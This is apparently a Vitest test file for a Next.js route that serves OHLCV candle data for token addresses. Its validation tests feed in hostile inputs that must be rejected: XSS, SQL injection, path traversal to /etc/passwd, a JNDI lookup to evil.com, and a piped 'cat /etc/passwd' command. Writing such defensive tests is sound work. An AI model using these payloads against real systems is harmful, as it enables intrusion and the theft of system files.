import { describe, it, expect, vi, beforeEach } from 'vitest';
import { GET } from '@/app/api/ohlcv/[address]/route';

vi.stubGlobal('fetch', vi.fn());

const VALID_ADDRESS = 'So11111111111111111111111111111111111111112';

function params(address: string) {
  return { params: Promise.resolve({ address }) };
}

function req(address: string, type?: string) {
  const url = `http://localhost/api/ohlcv/${address}${type ? `?type=${type}` : ''}`;
  return new Request(url);
}

describe('GET /api/ohlcv/[address]', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Valid requests', () => {
    it('returns 200 for valid address', async () => {
      const res = await GET(req(VALID_ADDRESS), params(VALID_ADDRESS));
      expect(res.status).toBe(200);
    });

    it('returns { candles: [...] } structure', async () => {
      const res = await GET(req(VALID_ADDRESS), params(VALID_ADDRESS));
      const data = await res.json();
      expect(data).toHaveProperty('candles');
      expect(Array.isArray(data.candles)).toBe(true);
    });

    it('returns candles with OHLCV fields', async () => {
      const res = await GET(req(VALID_ADDRESS), params(VALID_ADDRESS));
      const data = await res.json();
      const candle = data.candles[0];
      expect(candle).toHaveProperty('time');
      expect(candle).toHaveProperty('open');
      expect(candle).toHaveProperty('high');
      expect(candle).toHaveProperty('low');
      expect(candle).toHaveProperty('close');
      expect(candle).toHaveProperty('volume');
    });

    it('candle values are finite numbers', async () => {
      const res = await GET(req(VALID_ADDRESS), params(VALID_ADDRESS));
      const data = await res.json();
      for (const c of data.candles) {
        expect(Number.isFinite(c.open)).toBe(true);
        expect(Number.isFinite(c.high)).toBe(true);
        expect(Number.isFinite(c.low)).toBe(true);
        expect(Number.isFinite(c.close)).toBe(true);
      }
    });

    it('candle high >= candle low (price sanity)', async () => {
      const res = await GET(req(VALID_ADDRESS), params(VALID_ADDRESS));
      const data = await res.json();
      for (const c of data.candles) {
        expect(c.high).toBeGreaterThanOrEqual(c.low);
      }
    });

    it.each(['1m', '3m', '5m', '15m', '30m', '1H', '4H', '1D', '1W'])(
      'accepts valid timeframe "%s"',
      async (type) => {
        const res = await GET(req(VALID_ADDRESS, type), params(VALID_ADDRESS));
        expect(res.status).toBe(200);
      }
    );

    it('defaults to 15m when no type provided', async () => {
      const res = await GET(new Request(`http://localhost/api/ohlcv/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      expect(res.status).toBe(200);
    });
  });

  describe('Invalid address — 400', () => {
    const badAddresses = [
      '',
      'short',
      'A'.repeat(45),
      '<script>alert(1)</script>',
      "'; DROP TABLE candles;--",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com}',
      'addr|cat /etc/passwd',
      '\0nullbyte',
      '{{7*7}}',
    ];

    badAddresses.forEach(addr => {
      it(`rejects address: ${JSON.stringify(addr).slice(0, 35)}`, async () => {
        const res = await GET(req(addr), params(addr));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Invalid timeframe — 400', () => {
    const badTypes = [
      'invalid',
      '1year',
      '1h',   // wrong case
      '1d',
      'SELECT',
      "<script>",
      '../etc',
      '${7*7}',
      '1H; DROP TABLE--',
      'A'.repeat(100),
    ];

    badTypes.forEach(type => {
      it(`rejects timeframe: ${JSON.stringify(type).slice(0, 35)}`, async () => {
        const res = await GET(req(VALID_ADDRESS, type), params(VALID_ADDRESS));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Mock data safety', () => {
    it('does not produce NaN values in candles', async () => {
      // Test with various valid addresses to ensure seed price calculation is safe
      const addresses = [
        'So11111111111111111111111111111111111111112',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263',
        'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN',
      ];
      for (const addr of addresses) {
        const res = await GET(req(addr), params(addr));
        const data = await res.json();
        for (const c of data.candles) {
          expect(Number.isNaN(c.open)).toBe(false);
          expect(Number.isNaN(c.high)).toBe(false);
          expect(Number.isNaN(c.low)).toBe(false);
          expect(Number.isNaN(c.close)).toBe(false);
        }
      }
    });
  });
});
